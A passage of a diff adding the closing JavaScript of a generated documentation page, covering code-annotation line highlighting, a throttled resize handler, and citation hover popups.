+            const html = processXRef(null, note);
+            instance.setContent(html);
+          } 
+        }).finally(() => {
+          instance.enable();
+          instance.show();
+        });
+      }
+    }, function(instance) {
+    });
+  }
+      let selectedAnnoteEl;
+      const selectorForAnnotation = ( cell, annotation) => {
+        let cellAttr = 'data-code-cell="' + cell + '"';
+        let lineAttr = 'data-code-annotation="' +  annotation + '"';
+        const selector = 'span[' + cellAttr + '][' + lineAttr + ']';
+        return selector;
+      }
+      const selectCodeLines = (annoteEl) => {
+        const doc = window.document;
+        const targetCell = annoteEl.getAttribute("data-target-cell");
+        const targetAnnotation = annoteEl.getAttribute("data-target-annotation");
+        const annoteSpan = window.document.querySelector(selectorForAnnotation(targetCell, targetAnnotation));
+        const lines = annoteSpan.getAttribute("data-code-lines").split(",");
+        const lineIds = lines.map((line) => {
+          return targetCell + "-" + line;
+        })
+        let top = null;
+        let height = null;
+        let parent = null;
+        if (lineIds.length > 0) {
+            //compute the position of the single el (top and bottom and make a div)
+            const el = window.document.getElementById(lineIds[0]);
+            top = el.offsetTop;
+            height = el.offsetHeight;
+            parent = el.parentElement.parentElement;
+          if (lineIds.length > 1) {
+            const lastEl = window.document.getElementById(lineIds[lineIds.length - 1]);
+            const bottom = lastEl.offsetTop + lastEl.offsetHeight;
+            height = bottom - top;
+          }
+          if (top !== null && height !== null && parent !== null) {
+            // cook up a div (if necessary) and position it 
+            let div = window.document.getElementById("code-annotation-line-highlight");
+            if (div === null) {
+              div = window.document.createElement("div");
+              div.setAttribute("id", "code-annotation-line-highlight");
+              div.style.position = 'absolute';
+              parent.appendChild(div);
+            }
+            div.style.top = top - 2 + "px";
+            div.style.height = height + 4 + "px";
+            div.style.left = 0;
+            let gutterDiv = window.document.getElementById("code-annotation-line-highlight-gutter");
+            if (gutterDiv === null) {
+              gutterDiv = window.document.createElement("div");
+              gutterDiv.setAttribute("id", "code-annotation-line-highlight-gutter");
+              gutterDiv.style.position = 'absolute';
+              const codeCell = window.document.getElementById(targetCell);
+              const gutter = codeCell.querySelector('.code-annotation-gutter');
+              gutter.appendChild(gutterDiv);
+            }
+            gutterDiv.style.top = top - 2 + "px";
+            gutterDiv.style.height = height + 4 + "px";
+          }
+          selectedAnnoteEl = annoteEl;
+        }
+      };
+      const unselectCodeLines = () => {
+        const elementsIds = ["code-annotation-line-highlight", "code-annotation-line-highlight-gutter"];
+        elementsIds.forEach((elId) => {
+          const div = window.document.getElementById(elId);
+          if (div) {
+            div.remove();
+          }
+        });
+        selectedAnnoteEl = undefined;
+      };
+        // Handle positioning of the toggle
+    window.addEventListener(
+      "resize",
+      throttle(() => {
+        elRect = undefined;
+        if (selectedAnnoteEl) {
+          selectCodeLines(selectedAnnoteEl);
+        }
+      }, 10)
+    );
+    function throttle(fn, ms) {
+    let throttle = false;
+    let timer;
+      return (...args) => {
+        if(!throttle) { // first call gets through
+            fn.apply(this, args);
+            throttle = true;
+        } else { // all the others get throttled
+            if(timer) clearTimeout(timer); // cancel #2
+            timer = setTimeout(() => {
+              fn.apply(this, args);
+              timer = throttle = false;
+            }, ms);
+        }
+      };
+    }
+      // Attach click handler to the DT
+      const annoteDls = window.document.querySelectorAll('dt[data-target-cell]');
+      for (const annoteDlNode of annoteDls) {
+        annoteDlNode.addEventListener('click', (event) => {
+          const clickedEl = event.target;
+          if (clickedEl !== selectedAnnoteEl) {
+            unselectCodeLines();
+            const activeEl = window.document.querySelector('dt[data-target-cell].code-annotation-active');
+            if (activeEl) {
+              activeEl.classList.remove('code-annotation-active');
+            }
+            selectCodeLines(clickedEl);
+            clickedEl.classList.add('code-annotation-active');
+          } else {
+            // Unselect the line
+            unselectCodeLines();
+            clickedEl.classList.remove('code-annotation-active');
+          }
+        });
+      }
+  const findCites = (el) => {
+    const parentEl = el.parentElement;
+    if (parentEl) {
+      const cites = parentEl.dataset.cites;
+      if (cites) {
+        return {
+          el,
+          cites: cites.split(' ')
+        };
+      } else {
+        return findCites(el.parentElement)
+      }
+    } else {
+      return undefined;
+    }
+  };
+  var bibliorefs = window.document.querySelectorAll('a[role="doc-biblioref"]');
+  for (var i=0; i<bibliorefs.length; i++) {
+    const ref = bibliorefs[i];
+    const citeInfo = findCites(ref);
+    if (citeInfo) {
+      tippyHover(citeInfo.el, function() {
+        var popup = window.document.createElement('div');
+        citeInfo.cites.forEach(function(cite) {
+          var citeDiv = window.document.createElement('div');
+          citeDiv.classList.add('hanging-indent');
+          citeDiv.classList.add('csl-entry');
+          var biblioDiv = window.document.getElementById('ref-' + cite);
+          if (biblioDiv) {
+            citeDiv.innerHTML = biblioDiv.innerHTML;
+          }
+          popup.appendChild(citeDiv);
+        });
+        return popup.innerHTML;
+      });
+    }
+  }
+});
+</script>
+</div> <!-- /content -->
+
+
+
+
+</body></html>
